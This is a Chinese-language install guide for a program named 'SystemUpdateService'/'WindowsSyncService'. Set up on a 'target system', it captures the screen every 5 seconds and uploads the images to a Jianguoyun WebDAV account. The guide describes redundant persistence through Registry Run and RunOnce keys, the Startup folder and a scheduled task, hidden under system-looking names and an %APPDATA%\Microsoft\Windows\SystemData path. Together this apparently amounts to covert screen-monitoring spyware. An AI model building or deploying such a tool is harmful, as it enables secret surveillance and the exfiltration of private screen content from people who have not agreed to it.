# SystemUpdateService 安装和使用指南

## 快速开始

### 1. 环境准备

确保目标系统满足以下要求：
- Windows 10/11 操作系统
- Python 3.10+ （如果使用源码版本）
- 管理员权限（用于安装自启动）
- 稳定的网络连接

### 2. 获取坚果云 WebDAV 信息

1. 登录坚果云网页版
2. 进入 "账户信息" -> "安全选项"
3. 添加应用密码，记录：
   - 用户名：您的坚果云邮箱
   - 密码：生成的应用密码
   - WebDAV 地址：`https://dav.jianguoyun.com/dav/`

### 3. 配置文件设置

编辑 `config.json` 文件：

```json
{
    "webdav": {
        "url": "https://dav.jianguoyun.com/dav/",
        "username": "your_email@example.com",
        "password": "your_app_password",
        "remote_path": "/ScreenCaptures/"
    },
    "screenshot": {
        "interval_seconds": 5,
        "format": "webp",
        "quality": 10,
        "max_width": 1920,
        "max_height": 1080
    }
}
```

**重要参数说明：**
- `username`: 替换为您的坚果云邮箱
- `password`: 替换为坚果云应用密码
- `remote_path`: 截图保存的远程目录
- `interval_seconds`: 截图间隔（秒）
- `quality`: WebP 压缩质量（1-100，越小文件越小）

## 安装方式

### 方式一：使用编译版本（推荐）

1. **构建可执行文件**
   ```cmd
   # 安装依赖
   pip install -r requirements.txt
   
   # 构建程序
   build.bat
   ```

2. **安装服务**
   ```cmd
   # 以管理员身份运行
   cd dist
   autostart.bat
   ```

3. **验证安装**
   - 检查注册表启动项
   - 查看启动文件夹
   - 确认服务正在运行

### 方式二：使用源码版本

1. **直接运行**
   ```cmd
   # 启动守护进程
   python WindowsSyncService.py
   ```

2. **设置自启动**
   ```cmd
   # 创建计划任务
   python autostart_task.py create
   ```

## 高级配置

### 多重自启动策略

为确保服务稳定启动，系统使用多种自启动方式：

1. **注册表 Run 键**
   - 位置：`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
   - 项名：`WindowsSyncService`

2. **注册表 RunOnce 键**
   - 位置：`HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
   - 用作兜底启动

3. **启动文件夹**
   - 位置：`%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`
   - 复制可执行文件或创建快捷方式

4. **计划任务**（可选）
   ```cmd
   python autostart_task.py create
   ```

### 性能优化

1. **调整截图间隔**
   ```json
   "screenshot": {
       "interval_seconds": 10  // 降低频率减少资源占用
   }
   ```

2. **优化压缩设置**
   ```json
   "screenshot": {
       "quality": 5,           // 更低质量，更小文件
       "max_width": 1280,      // 限制最大分辨率
       "max_height": 720
   }
   ```

3. **网络优化**
   ```json
   "upload": {
       "timeout_seconds": 60,  // 增加超时时间
       "retry_interval_seconds": 600  // 延长重试间隔
   }
   ```

## 监控和维护

### 日志查看

```cmd
# 查看主服务日志
type logs\update_sync.log

# 查看最新日志
powershell "Get-Content logs\update_sync.log -Tail 50"
```

### 缓存管理

```cmd
# 查看失败上传缓存
dir cache\failed_uploads

# 手动清理缓存
del cache\failed_uploads\*.webp
```

### 服务状态检查

```cmd
# 检查进程是否运行
tasklist | findstr WindowsSyncService
tasklist | findstr SystemUpdateService

# 检查计划任务状态
python autostart_task.py status
```

## 故障排除

### 常见问题

1. **服务无法启动**
   - 检查 Python 环境
   - 验证配置文件格式
   - 查看日志错误信息

2. **截图失败**
   - 确认屏幕分辨率设置
   - 检查磁盘空间
   - 验证权限设置

3. **上传失败**
   - 测试网络连接
   - 验证 WebDAV 凭据
   - 检查远程目录权限

4. **守护进程异常**
   - 重启 WindowsSyncService
   - 检查进程冲突
   - 查看系统事件日志

### 验证运行效果

1. **检查截图文件命名**
   - 登录坚果云网页版
   - 查看 `/ScreenCaptures/` 目录
   - 文件命名格式：`计算机名_时间戳.webp`
   - 例如：`DESKTOP-ABC123_20241220_143052.webp`、`LAPTOP-USER_20241220_143053.webp`

2. **文件命名说明**
   - 计算机名：自动获取当前计算机的主机名
   - 时间戳：格式为 `YYYYMMDD_HHMMSS`
   - 扩展名：`.webp` 压缩格式
   - 优势：多台电脑截图不会冲突，易于识别来源

### 调试模式

1. **启用详细日志**
   ```json
   "system": {
       "log_level": "DEBUG"
   }
   ```

2. **手动测试上传**
   ```python
   from utils import WebDAVUploader, load_config, Logger
   
   config = load_config()
   logger = Logger(config)
   uploader = WebDAVUploader(config, logger)
   
   # 测试上传
   result = uploader.upload_file("test.txt", "test.txt")
   print(f"Upload result: {result}")
   ```

## 卸载说明

### 完全卸载

1. **停止服务**
   ```cmd
   taskkill /f /im WindowsSyncService.exe
   taskkill /f /im SystemUpdateService.exe
   ```

2. **删除自启动项**
   ```cmd
   # 删除注册表项
   reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsSyncService" /f
   
   # 删除计划任务
   python autostart_task.py remove
   
   # 删除启动文件夹文件
   del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsSyncService.*"
   ```

3. **删除程序文件**
   ```cmd
   rmdir /s /q "%APPDATA%\Microsoft\Windows\SystemData"
   ```

## 安全注意事项

1. **配置文件保护**
   - 设置适当的文件权限
   - 避免在共享环境中暴露凭据

2. **网络安全**
   - 使用 HTTPS 连接
   - 定期更换应用密码

3. **系统权限**
   - 以最小权限运行
   - 避免使用管理员权限运行主服务

---

如有问题，请查看日志文件或联系技术支持。
